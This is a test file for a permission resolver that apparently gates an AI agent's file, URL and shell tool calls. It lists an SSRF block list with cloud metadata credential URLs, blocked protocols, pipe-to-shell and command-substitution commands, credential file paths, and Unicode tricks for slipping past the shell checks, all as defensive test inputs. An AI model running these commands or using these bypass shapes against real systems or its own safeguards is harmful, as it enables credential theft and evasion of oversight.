import { beforeAll, describe, expect, test } from 'bun:test';
import { initBashParser } from '../../src/permissions/bash-parser.ts';
import { type Capability, formatCapability } from '../../src/permissions/capabilities.ts';
// Importing the index file loads every builtin resolver via its
// side-effecting register calls.
import {
  type ResolverContext,
  getResolver,
  resolveCapabilities,
} from '../../src/permissions/resolvers/index.ts';

// Bash resolver needs the tree-sitter-bash grammar loaded. Init is
// async + idempotent; calling once before any bash test runs is
// enough. The other resolvers don't need it but pay zero cost
// either way.
beforeAll(async () => {
  await initBashParser();
});

const CTX: ResolverContext = { cwd: '/work/proj', home: '/home/op' };

const capStrings = (caps: readonly Capability[]): string[] => caps.map(formatCapability);

describe('registry', () => {
  test('builtins are registered on import', () => {
    for (const name of [
      'read_file',
      'write_file',
      'edit_file',
      'grep',
      'glob',
      'fetch_url',
      'bash',
    ]) {
      expect(getResolver(name)).toBeDefined();
    }
  });

  test('unknown tool falls back to Conservative with empty capabilities', () => {
    const r = resolveCapabilities('mystery_tool', {}, CTX);
    expect(r.kind).toBe('conservative');
    if (r.kind === 'conservative') {
      expect(r.capabilities).toEqual([]);
      expect(r.reason).toContain('no resolver registered');
    }
  });
});

describe('read_file resolver', () => {
  test('resolves relative path against cwd', () => {
    const r = resolveCapabilities('read_file', { file_path: 'src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj/src/index.ts']);
      expect(r.confidence).toBe('high');
    }
  });

  test('absolute path preserved', () => {
    const r = resolveCapabilities('read_file', { file_path: '/etc/hosts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/etc/hosts']);
    }
  });

  test('missing arg refuses', () => {
    const r = resolveCapabilities('read_file', {}, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('wrong type refuses', () => {
    const r = resolveCapabilities('read_file', { file_path: 123 }, CTX);
    expect(r.kind).toBe('refuse');
  });
});

describe('write_file / edit_file resolvers', () => {
  test('write_file produces write-fs AND read-fs', () => {
    const r = resolveCapabilities('write_file', { file_path: './out.txt' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const strings = capStrings(r.capabilities).sort();
      expect(strings).toEqual(['read-fs:/work/proj/out.txt', 'write-fs:/work/proj/out.txt']);
    }
  });

  test('edit_file shape matches write_file', () => {
    const w = resolveCapabilities('write_file', { file_path: 'x' }, CTX);
    const e = resolveCapabilities('edit_file', { file_path: 'x' }, CTX);
    if (w.kind === 'ok' && e.kind === 'ok') {
      expect(capStrings(w.capabilities).sort()).toEqual(capStrings(e.capabilities).sort());
    }
  });
});

describe('grep + glob resolvers', () => {
  test('grep without path falls back to cwd', () => {
    const r = resolveCapabilities('grep', { pattern: 'foo' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj']);
    }
  });
  test('grep with path produces read-fs for that path', () => {
    const r = resolveCapabilities('grep', { pattern: 'x', path: 'src' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj/src']);
    }
  });
  test('glob without cwd uses session cwd', () => {
    const r = resolveCapabilities('glob', { pattern: '**/*.ts' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj']);
    }
  });
  test('glob honors explicit cwd', () => {
    const r = resolveCapabilities('glob', { pattern: '**/*.ts', cwd: 'tests' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['read-fs:/work/proj/tests']);
    }
  });
});

describe('fetch_url resolver', () => {
  test('http URL produces net-egress with host', () => {
    const r = resolveCapabilities('fetch_url', { url: 'https://api.example.com/x' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['net-egress:api.example.com']);
    }
  });
  test('host case is normalized', () => {
    const r = resolveCapabilities('fetch_url', { url: 'https://API.Github.COM' }, CTX);
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['net-egress:api.github.com']);
    }
  });
  test('non-http(s) refuses', () => {
    expect(resolveCapabilities('fetch_url', { url: 'file:///etc/passwd' }, CTX).kind).toBe(
      'refuse',
    );
    expect(resolveCapabilities('fetch_url', { url: 'ftp://example.com' }, CTX).kind).toBe('refuse');
    expect(resolveCapabilities('fetch_url', { url: 'gopher://x' }, CTX).kind).toBe('refuse');
  });

  // Slice 135 P1 sec-7: fetch_url protocol-gate parametric matrix.
  // The resolver's `ALLOWED_PROTOCOLS` set permits only `http:`
  // and `https:`. Every other scheme — file/ftp/ws/data/etc. —
  // MUST refuse with a protocol-not-supported reason. The shallow
  // test above covers 3 schemes inline; this matrix exhausts the
  // realistic attack surface so a regression that widened the
  // allowlist (e.g., adding `data:` for "convenience" or accepting
  // `ws:` thinking it's safe) gets caught.
  describe('protocol gate matrix (slice 135 P1 sec-7)', () => {
    const refusedProtocols = [
      // file:// — local FS read via fetch
      'file:///etc/passwd',
      'FILE:///etc/passwd', // case variant
      // ftp / sftp / ftps — older transfer protocols
      'ftp://example.com/data',
      'sftp://example.com/data',
      'ftps://example.com/data',
      // gopher — historical, exploitable for SMTP/Redis smuggling
      'gopher://x:70/',
      // ws / wss — websocket upgrade not modeled by the http handler
      'ws://example.com/',
      'wss://example.com/',
      // data: — would inline arbitrary content under fetch
      'data:text/plain,inline',
      // javascript: — script eval surface
      'javascript:alert(1)',
      // mailto: — protocol handler dispatch
      'mailto:victim@example.com',
      // about: / chrome: / chrome-extension: — browser internals
      'about:blank',
      'chrome://settings/',
      // ssh:// — could be intercepted by libcurl's ssh handler
      'ssh://user@example.com/',
      // ldap / ldaps — LDAP injection surface
      'ldap://example.com/',
      'ldaps://example.com/',
      // smb / cifs — Windows network share
      'smb://example.com/share',
      'cifs://example.com/share',
      // telnet — old text protocol with credential leakage
      'telnet://example.com:23/',
      // dict — RFC2229, exploitable like gopher
      'dict://example.com/',
    ];
    for (const url of refusedProtocols) {
      test(`refuses ${url}`, () => {
        const r = resolveCapabilities('fetch_url', { url }, CTX);
        expect(r.kind).toBe('refuse');
        if (r.kind === 'refuse') {
          // Either the dedicated protocol-gate reason or the URL
          // parser rejecting it earlier — both shapes satisfy
          // the contract "this URL never reaches the network".
          expect(r.reason).toMatch(/protocol|fetch_url|invalid|unsupported/i);
        }
      });
    }

    // Inverse: http(s) variants ALL allow (case-insensitive scheme).
    test('http and HTTPS (uppercase) both allow', () => {
      const lower = resolveCapabilities('fetch_url', { url: 'http://example.com/' }, CTX);
      expect(lower.kind).toBe('ok');
      const upper = resolveCapabilities('fetch_url', { url: 'HTTPS://example.com/' }, CTX);
      expect(upper.kind).toBe('ok');
    });
  });
  test('malformed URL refuses', () => {
    expect(resolveCapabilities('fetch_url', { url: 'not a url' }, CTX).kind).toBe('refuse');
  });
  test('missing arg refuses', () => {
    expect(resolveCapabilities('fetch_url', {}, CTX).kind).toBe('refuse');
  });

  // Slice 129 (R5 SSRF P0): unconditional blocklist gates BEFORE
  // engine consults operator allow/deny lists. Each entry below
  // covers a class from SECURITY_GUIDELINE.md §9.1.6.
  describe('SSRF blocklist (slice 129)', () => {
    const blocked = [
      'http://localhost/',
      'http://LOCALHOST/',
      'http://x.localhost/',
      'http://metadata.google.internal/',
      'http://metadata.azure.com/',
      'http://my.metadata.azure.com/',
      'http://metadata/',
      'http://127.0.0.1/',
      'http://127.42.0.99/',
      'http://0.0.0.0/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://169.254.42.7/',
      'http://10.0.0.1/',
      'http://10.255.255.255/',
      'http://172.16.0.1/',
      'http://172.31.255.254/',
      'http://192.168.1.1/',
      'http://100.64.0.1/',
      'http://224.0.0.1/',
      'http://[::1]/',
      'http://[::]/',
      'http://[fe80::1]/',
      'http://[fc00::1]/',
      'http://[fd12:3456:789a::1]/',
      'http://[::ffff:127.0.0.1]/',
    ];
    for (const url of blocked) {
      test(`refuses ${url}`, () => {
        const r = resolveCapabilities('fetch_url', { url }, CTX);
        expect(r.kind).toBe('refuse');
        if (r.kind === 'refuse') {
          expect(r.reason).toMatch(/SSRF/i);
        }
      });
    }
    // Boundary: 172.32.x.x is OUTSIDE the 172.16/12 RFC1918 range
    // and must NOT be blocked.
    test('allows 172.32.0.1 (outside RFC1918 172.16/12)', () => {
      const r = resolveCapabilities('fetch_url', { url: 'http://172.32.0.1/' }, CTX);
      expect(r.kind).toBe('ok');
    });
    test('allows public host', () => {
      const r = resolveCapabilities('fetch_url', { url: 'https://example.com/' }, CTX);
      expect(r.kind).toBe('ok');
    });
  });
});

describe('bash resolver — simple commands', () => {
  test('ls produces exec:shell + read-fs', () => {
    const r = resolveCapabilities('bash', { command: 'ls -la' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:shell');
      expect(s).toContain('read-fs:/work/proj');
    }
  });

  test('ls with path target produces read-fs of that path', () => {
    const r = resolveCapabilities('bash', { command: 'ls /etc' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/etc');
    }
  });

  test('rm produces delete-fs', () => {
    const r = resolveCapabilities('bash', { command: 'rm -rf /tmp/x' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/tmp/x');
    }
  });

  test('mv produces read-fs + write-fs', () => {
    const r = resolveCapabilities('bash', { command: 'mv src/a.ts src/b.ts' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/a.ts');
      expect(s).toContain('write-fs:/work/proj/src/b.ts');
    }
  });

  test('curl produces net-egress with extracted host', () => {
    const r = resolveCapabilities('bash', { command: 'curl https://api.github.com/repos' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('net-egress:api.github.com');
    }
  });

  test('git status produces git-write read-only', () => {
    const r = resolveCapabilities('bash', { command: 'git status' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj');
    }
  });

  test('git push produces git-write + net-egress', () => {
    const r = resolveCapabilities('bash', { command: 'git push origin main' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('git-write:/work/proj');
      expect(s).toContain('net-egress:*');
    }
  });

  test('git clean -fd produces delete-fs', () => {
    const r = resolveCapabilities('bash', { command: 'git clean -fd' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/work/proj');
    }
  });

  test('npm install produces exec:arbitrary + write-fs(node_modules) + net-egress(registry)', () => {
    const r = resolveCapabilities('bash', { command: 'npm install' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:arbitrary');
      expect(s).toContain('write-fs:/work/proj/node_modules');
      expect(s).toContain('net-egress:registry.npmjs.org');
    }
  });

  test('chmod produces write-fs of target', () => {
    const r = resolveCapabilities('bash', { command: 'chmod 755 ./script.sh' }, CTX);
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/work/proj/script.sh');
    }
  });
});

describe('bash resolver — refusals', () => {
  test.each(['dd', 'mkfs.ext4', 'fdisk', 'parted', 'mkswap', 'shred', 'eval $X', 'source ./foo'])(
    'refuses %s',
    (cmd) => {
      const r = resolveCapabilities('bash', { command: cmd }, CTX);
      expect(r.kind === 'refuse' || r.kind === 'conservative').toBe(true);
    },
  );

  test('refuses bash -c (dynamic shell)', () => {
    const r = resolveCapabilities('bash', { command: 'bash -c "do something"' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('refuses curl --proxy (evasion shape)', () => {
    const r = resolveCapabilities('bash', { command: 'curl --proxy x https://foo.com' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('refuses rm without target', () => {
    const r = resolveCapabilities('bash', { command: 'rm' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('refuses mv with single arg', () => {
    const r = resolveCapabilities('bash', { command: 'mv only-one' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('missing command yields empty Ok (engine-internal reject handled downstream)', () => {
    // Missing-arg cases are detected by `checkBash` in the engine,
    // which produces a deny with `source.layer='default'` and no
    // section. Returning `refuse` here would re-route attribution
    // to `resolver-refuse`, which is reserved for structural
    // dangers (dd, eval, bash -c with dynamic arg). Empty Ok
    // keeps the downstream deny clean.
    const r = resolveCapabilities('bash', {}, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(r.capabilities).toEqual([]);
    }
  });
});

describe('bash resolver — adversarial shapes are Refused (slice 6: whitelist + Refuse)', () => {
  test('pipe-to-shell pattern is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'curl URL | sh' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('pipe-to-shell');
    }
  });

  test('command substitution $() is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'echo $(cat /etc/passwd)' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('command_substitution');
    }
  });

  test('backtick command substitution is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'echo `whoami`' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('parameter expansion ${var/...} is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'echo ${HOME/op/root}' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('process substitution <(cmd) is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'cat <(ls)' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('process_substitution');
    }
  });

  test('unknown first-token is Refused (closed whitelist)', () => {
    const r = resolveCapabilities('bash', { command: 'mystery-cli --do-thing' }, CTX);
    expect(r.kind).toBe('refuse');
    if (r.kind === 'refuse') {
      expect(r.reason).toContain('mystery-cli');
    }
  });

  test('cmd1; cmd2 with one unknown is Refused', () => {
    const r = resolveCapabilities('bash', { command: 'cmd1; cmd2' }, CTX);
    expect(r.kind).toBe('refuse');
  });
});

// Slice 135 P1 sec-2: RED_FLAG_NODES parametric coverage. The bash
// resolver's RED_FLAG_NODES map (22 entries in bash.ts) is the
// adversarial-shape blacklist — every node type here triggers a
// refuse with a stable reason. The shallow tests above cover
// command_substitution / process_substitution / parameter
// expansion. This block pins the remaining shapes so a regression
// that shrinks the map silently lets one through.
describe('bash resolver — RED_FLAG_NODES exhaustive (slice 135 P1 sec-2)', () => {
  const cases: Array<{ name: string; cmd: string; reasonContains: string }> = [
    {
      name: 'simple_expansion ($var) is Refused',
      cmd: 'ls $HOME',
      reasonContains: 'variable_expansion',
    },
    {
      name: 'arithmetic_expansion ($((...))) is Refused',
      cmd: 'echo $((1 + 2))',
      reasonContains: 'arithmetic_expansion',
    },
    {
      name: 'function_definition is Refused',
      cmd: 'foo() { ls; }',
      reasonContains: 'function_definition',
    },
    {
      name: 'variable_assignment prefix is Refused',
      cmd: 'PATH=/tmp ls',
      reasonContains: 'variable_assignment',
    },
    {
      name: "ansi_c_string ($'...') is Refused",
      cmd: "echo $'\\x41'",
      reasonContains: 'ansi_c_string',
    },
    {
      name: 'heredoc_redirect (<<DELIM) is Refused',
      cmd: 'cat <<EOF\nbody\nEOF',
      reasonContains: 'heredoc_redirect',
    },
    {
      name: 'herestring_redirect (<<<) is Refused',
      cmd: 'cat <<< "data"',
      reasonContains: 'herestring_redirect',
    },
    {
      name: 'if_statement is Refused',
      cmd: 'if true; then ls; fi',
      reasonContains: 'if_statement',
    },
    {
      name: 'while_statement is Refused',
      cmd: 'while true; do ls; done',
      reasonContains: 'while_statement',
    },
    {
      name: 'for_statement is Refused',
      cmd: 'for i in a b; do echo $i; done',
      reasonContains: 'for_statement',
    },
    {
      name: 'case_statement is Refused',
      cmd: 'case $x in a) ls;; esac',
      reasonContains: 'case_statement',
    },
    {
      name: 'subshell ((cmd)) is Refused',
      cmd: '(ls)',
      reasonContains: 'subshell',
    },
    {
      name: 'compound_statement ({cmd;}) is Refused',
      cmd: '{ ls; pwd; }',
      reasonContains: 'compound_statement',
    },
    {
      name: 'negated_command (!cmd) is Refused',
      cmd: '! ls',
      reasonContains: 'negated_command',
    },
    {
      name: 'test_command ([[ ]]) is Refused',
      cmd: '[[ -e /tmp ]]',
      reasonContains: 'test_command',
    },
  ];
  for (const c of cases) {
    test(c.name, () => {
      const r = resolveCapabilities('bash', { command: c.cmd }, CTX);
      expect(r.kind).toBe('refuse');
      if (r.kind === 'refuse') {
        expect(r.reason).toContain(c.reasonContains);
      }
    });
  }
});

describe('bash resolver — well-known compound shapes resolve to Ok', () => {
  test('logical chain (&&) of known commands aggregates capabilities', () => {
    const r = resolveCapabilities('bash', { command: 'ls && rm /tmp/x' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('exec:shell');
      expect(s).toContain('delete-fs:/tmp/x');
    }
  });

  test('single command with literal redirect emits write-fs', () => {
    const r = resolveCapabilities('bash', { command: 'echo hi > /tmp/out' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/tmp/out');
    }
  });

  test('find with literal redirect is Ok (single command, AST recognized)', () => {
    const r = resolveCapabilities('bash', { command: 'find . -name "*.ts" > /tmp/list' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — per-command argument semantics', () => {
  // Fix #1: echo / printf are pure-output. Their args are literal
  // strings emitted to stdout, NOT filesystem paths. The resolver
  // must not attribute read-fs for path-shaped args, nor must the
  // protected-path check fire (`echo /etc/passwd` does not read
  // /etc/passwd, it just prints the string).
  test('echo with path-shaped arg does NOT emit read-fs', () => {
    const r = resolveCapabilities('bash', { command: 'echo /work/proj/src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toEqual(['exec:shell']);
      expect(s).not.toContain('read-fs:/work/proj/src/index.ts');
    }
  });

  test('echo /etc/passwd does NOT fire protected-path (no fs read)', () => {
    // Without fix #1, this would either deny (protected /etc) or
    // escalate confidence to low. With pure-output semantics the
    // string is just bytes on stdout.
    const r = resolveCapabilities('bash', { command: 'echo /etc/passwd' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(r.confidence).toBe('high');
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });

  test('echo with quoted string does NOT split into multiple read-fs', () => {
    // The old `cmdRead` mapping would have turned "hello world" into
    // a single read-fs:`hello world` path. cmdEcho returns nothing.
    const r = resolveCapabilities('bash', { command: 'echo "hello world"' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });

  test('echo redirect target IS protected-path checked (defense in depth)', () => {
    // The redirect loop in analyzeCommand runs for every command
    // regardless of pure-output status — writing bytes to /etc/foo
    // is dangerous whoever produced them. Should escalate.
    const r = resolveCapabilities('bash', { command: 'echo hi > /etc/hosts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('write-fs:/etc/hosts');
      expect(r.confidence).toBe('low');
    }
  });

  test('printf is also treated as pure-output', () => {
    const r = resolveCapabilities('bash', { command: 'printf "%s\\n" /work/proj/file' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toEqual(['exec:shell']);
    }
  });

  // Fix #2: grep / rg first positional is the regex pattern, not a
  // file path. The resolver must skip it. find, in contrast, takes
  // all positionals as paths.
  test('grep pattern file → read-fs of file only (pattern NOT a path)', () => {
    const r = resolveCapabilities('bash', { command: 'grep token src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/index.ts');
      expect(s).not.toContain('read-fs:/work/proj/token');
    }
  });

  test('grep with only pattern (stdin mode) falls back to read-fs of cwd', () => {
    const r = resolveCapabilities('bash', { command: 'grep TODO' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj');
      expect(s).not.toContain('read-fs:/work/proj/TODO');
    }
  });

  test('grep pattern f1 f2 f3 → read-fs of f1, f2, f3 only', () => {
    const r = resolveCapabilities(
      'bash',
      { command: 'grep needle src/a.ts src/b.ts src/c.ts' },
      CTX,
    );
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/a.ts');
      expect(s).toContain('read-fs:/work/proj/src/b.ts');
      expect(s).toContain('read-fs:/work/proj/src/c.ts');
      expect(s).not.toContain('read-fs:/work/proj/needle');
    }
  });

  test('rg also skips first positional (same pattern-first semantics)', () => {
    const r = resolveCapabilities('bash', { command: 'rg foo src' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).not.toContain('read-fs:/work/proj/foo');
    }
  });

  test('find positionals ARE paths (not pattern-first)', () => {
    const r = resolveCapabilities('bash', { command: 'find src tests -name "*.ts"' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src');
      expect(s).toContain('read-fs:/work/proj/tests');
    }
  });

  // Fix #3: `--` separates flags from positionals. Tokens after
  // `--` are positional regardless of leading dash; `--` itself
  // is consumed (never a positional path).
  test('rm -- pos: `--` is consumed, positional path follows', () => {
    const r = resolveCapabilities('bash', { command: 'rm -- /tmp/x' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/tmp/x');
      // `--` must not show up as a phantom delete target
      expect(s).not.toContain('delete-fs:/work/proj/--');
    }
  });

  test('rm -- -dashed-file: leading-dash filename is positional after `--`', () => {
    // POSIX convention: `rm -- -rf` deletes a file literally named
    // "-rf". stripFlags after `--` must keep it.
    const r = resolveCapabilities('bash', { command: 'rm -- -dashfile' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('delete-fs:/work/proj/-dashfile');
    }
  });

  test('grep -- pattern file: `--` is consumed, then pattern-skip applies', () => {
    const r = resolveCapabilities('bash', { command: 'grep -- pattern src/index.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities).sort();
      expect(s).toContain('read-fs:/work/proj/src/index.ts');
      expect(s).not.toContain('read-fs:/work/proj/pattern');
      expect(s).not.toContain('read-fs:/work/proj/--');
    }
  });
});

// Slice 97 — R2 P0 finding: tilde was previously left literal by
// both `fs.resolveAbs` and `bash.resolveArg`, so model-emitted
// `~/.ssh/id_rsa` resolved to a literal `~` directory under cwd
// (`/work/proj/~/.ssh/id_rsa`). Shells expand `~` on execution, so
// the resolver view diverged from the runtime view — a `~`-rooted
// protected_paths rule could never match because the lexical scope
// no longer mentioned HOME. Slice 97 expands `~` and `~/<rest>`
// before `path.resolve` in BOTH resolvers, closing the gap.
describe('tilde expansion (slice 97, R2 P0)', () => {
  test('read_file file_path="~/.ssh/id_rsa" resolves under HOME, not under cwd', () => {
    const r = resolveCapabilities('read_file', { file_path: '~/.ssh/id_rsa' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('read-fs:/home/op/.ssh/id_rsa');
      // Negative — pre-slice this was the bug shape.
      expect(capStrings(r.capabilities)).not.toContain('read-fs:/work/proj/~/.ssh/id_rsa');
    }
  });

  test('bare "~" expands to HOME', () => {
    const r = resolveCapabilities('read_file', { file_path: '~' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('read-fs:/home/op');
    }
  });

  test('write_file path="~/.aws/credentials" lands under HOME', () => {
    const r = resolveCapabilities('write_file', { file_path: '~/.aws/credentials' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('write-fs:/home/op/.aws/credentials');
      expect(s).toContain('read-fs:/home/op/.aws/credentials');
    }
  });

  test('bash "cat ~/.ssh/known_hosts" resolves the arg under HOME', () => {
    const r = resolveCapabilities('bash', { command: 'cat ~/.ssh/known_hosts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      const s = capStrings(r.capabilities);
      expect(s).toContain('read-fs:/home/op/.ssh/known_hosts');
      expect(s).not.toContain('read-fs:/work/proj/~/.ssh/known_hosts');
    }
  });

  test('"~user/..." stays literal (other-user expansion is not safely resolvable)', () => {
    // Shell would expand `~root/...` against /etc/passwd; the engine
    // can't safely do that without an OS call and an LLM emitting
    // `~root/` is much more often an attack than legitimate. The
    // literal form will fail the policy in a downstream layer.
    const r = resolveCapabilities('read_file', { file_path: '~root/.ssh/id_rsa' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      // Literal `~root` under cwd — not HOME-expanded. The engine
      // is structurally unable to resolve it; the policy will
      // either deny or surface a confirm depending on configuration.
      expect(capStrings(r.capabilities)).toContain('read-fs:/work/proj/~root/.ssh/id_rsa');
    }
  });

  test('embedded "~" mid-path stays literal (not a shell-recognized form)', () => {
    // Shell only expands `~` at the start of a word; `src/~/foo`
    // is NOT a tilde reference. Resolver matches that contract —
    // expansion only when the input is `~` or starts with `~/`.
    const r = resolveCapabilities('read_file', { file_path: 'src/~/foo.ts' }, CTX);
    expect(r.kind).toBe('ok');
    if (r.kind === 'ok') {
      expect(capStrings(r.capabilities)).toContain('read-fs:/work/proj/src/~/foo.ts');
    }
  });
});

// Slice 98 — R2 bash AST hardening. Three coordinated changes:
//   #196 literalText Unicode bypass (fullwidth / zero-width / RTL
//        / C1 control codepoints land as `Refuse` instead of
//        leaking through as the wrong byte sequence)
//   #198 walkAst recursion depth ceiling (pathological nested
//        input → structured refuse, not stack overflow)
//   #200 cmdCurlWget emits write-fs for `-o <path>` shapes (the
//        curl/wget download-to-file form was silently
//        net-egress-only; now write capabilities flow into
//        protected-path classification)
describe('bash resolver — Unicode bypass (slice 98, R2 #196)', () => {
  test('fullwidth semicolon in command name refuses', () => {
    // U+FF1B (fullwidth ；) renders as `;` to humans but is a
    // distinct codepoint. A deny rule against `;` would NOT
    // match `ls；rm` because tree-sitter tokenizes the fullwidth
    // form as part of the word, not as a punctuation `;`. Refuse
    // forces the operator's modal to see the literal.
    const r = resolveCapabilities('bash', { command: 'ls；rm' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('zero-width joiner inside command name refuses', () => {
    // `gi<ZWJ>t` renders as `git` but is a different byte sequence.
    // Without sanitization, an audit log would store `git` and the
    // operator would think a normal git invocation happened.
    const r = resolveCapabilities('bash', { command: 'gi‍t status' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('RTL override inside arg refuses', () => {
    // U+202E reverses display order. An adversarial source line
    // visible as `cat README` could execute `rm -rf /` if the
    // resolver trusted node.text.
    const r = resolveCapabilities('bash', { command: 'cat r‮README' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('byte-order mark inside arg refuses', () => {
    // U+FEFF is a zero-width-no-break-space that shells often
    // pass through verbatim. Hiding it inside `--config=...`
    // shifts the audited literal away from what got executed.
    const r = resolveCapabilities('bash', { command: 'echo ﻿foo' }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('pure ASCII args still resolve cleanly (no false positives)', () => {
    // The defense MUST NOT regress the routine cases. `cat README`
    // emits a read-fs cap; `echo hello` no-ops the cap set.
    const r = resolveCapabilities('bash', { command: 'cat README' }, CTX);
    expect(r.kind).toBe('ok');
  });
});

describe('bash resolver — recursion depth ceiling (slice 98, R2 #198)', () => {
  test('pathologically nested input refuses without crashing (defense in depth)', () => {
    // The depth ceiling guards against adversarial input that would
    // otherwise blow the JS stack. Pre-slice, ~100k levels of
    // recursion could crash the engine before any refuse could
    // surface. The test PRIMARY assertion is "no crash": the
    // resolver MUST return a structured refuse, never throw.
    //
    // In practice, deep nesting hits an EARLIER defense first
    // (red-flag `compound_statement` for `(...)`, parse-error for
    // malformed shapes, etc.) — both outcomes count as defended.
    // The depth-exceeded reason is reserved for inputs that
    // legitimately parse + walk through that many levels but
    // exceed the ceiling.
    let cmd = 'ls';
    for (let i = 0; i < 100; i += 1) cmd = `(${cmd})`;
    const r = resolveCapabilities('bash', { command: cmd }, CTX);
    expect(r.kind).toBe('refuse');
  });

  test('depth ceiling does not throw — returns structured refuse on deep walk', () => {
    // 1000-level pipeline `cmd | cmd | cmd | ...`. Tree-sitter
    // parses these as left-folded pipeline nodes; each level
    // recurses through `visit`. Without MAX_AST_DEPTH the JS
    // stack would unwind via RangeError; with the ceiling, a
    // refuse envelope surfaces instead.
    const cmd = Array.from({ length: 1000 }, () => 'ls').join(' | ');
